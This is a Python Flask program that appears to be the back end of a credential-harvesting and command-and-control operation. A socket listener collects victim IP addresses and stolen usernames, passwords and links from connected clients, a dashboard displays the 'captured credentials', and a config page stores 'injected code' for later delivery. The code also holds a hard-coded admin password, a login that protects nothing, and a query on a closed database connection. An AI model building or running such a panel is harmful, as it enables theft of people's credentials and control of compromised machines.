from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import socket
import threading
import json

app = Flask(__name__)

# Simple authentication setup
users = {'admin': 'csM223@'}

# Database setup to store clients and credentials
def init_db():
    conn = sqlite3.connect('clients.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (id INTEGER PRIMARY KEY, ip TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY, username TEXT, password TEXT, link TEXT)''')
    conn.commit()
    conn.close()

# Socket setup
clients = []

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break
            
            data = data.decode("utf-8")
            print(f"Received: {data}")
            
            if data.startswith("CLIENT_INFO"):
                ip = data.split(" ")[1]
                conn = sqlite3.connect('clients.db')
                c = conn.cursor()
                c.execute("INSERT INTO clients (ip) VALUES (?)", (ip,))
                conn.commit()
                conn.close()

            if data.startswith("CREDENTIALS"):
                credentials_data = data.split(" ")[1]
                credentials = json.loads(credentials_data)
                username = credentials.get("username")
                password = credentials.get("password")
                link = credentials.get("link")
                conn = sqlite3.connect('clients.db')
                c = conn.cursor()
                c.execute("INSERT INTO credentials (username, password, link) VALUES (?, ?, ?)", (username, password, link))
                conn.commit()
                conn.close()

        except Exception as e:
            print(f"Error: {str(e)}")
            break
    client_socket.close()

def start_socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Listen on all interfaces, port 9999
    server.listen(5)
    print("[*] Server listening on port 9999")
    
    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr}")
        clients.append(client_socket)
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if users.get(username) == password:
            return redirect(url_for('index'))
    return render_template('login.html')

@app.route('/')
def index():
    # Get active clients from the database
    conn = sqlite3.connect('clients.db')
    c = conn.cursor()
    c.execute("SELECT * FROM clients")
    clients = c.fetchall()
    conn.close()

    # Get captured credentials from the database
    conn = sqlite3.connect('clients.db')
    c.execute("SELECT * FROM credentials")
    credentials = c.fetchall()
    conn.close()

    return render_template('index.html', clients=clients, credentials=credentials)

@app.route('/config', methods=['GET', 'POST'])
def config():
    if request.method == 'POST':
        injected_code = request.form['injected_code']
        # Store or handle the injected code for later use
        conn = sqlite3.connect('clients.db')
        c = conn.cursor()
        c.execute("INSERT INTO credentials (username, password, link) VALUES (?, ?, ?)", ("injection", injected_code, "config"))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))

    return render_template('config.html')

if __name__ == "__main__":
    init_db()  # Initialize the database
    socket_thread = threading.Thread(target=start_socket_server)
    socket_thread.daemon = True
    socket_thread.start()  # Start the socket server
    app.run(host='0.0.0.0', port=80)  # Run Flask app on port 80
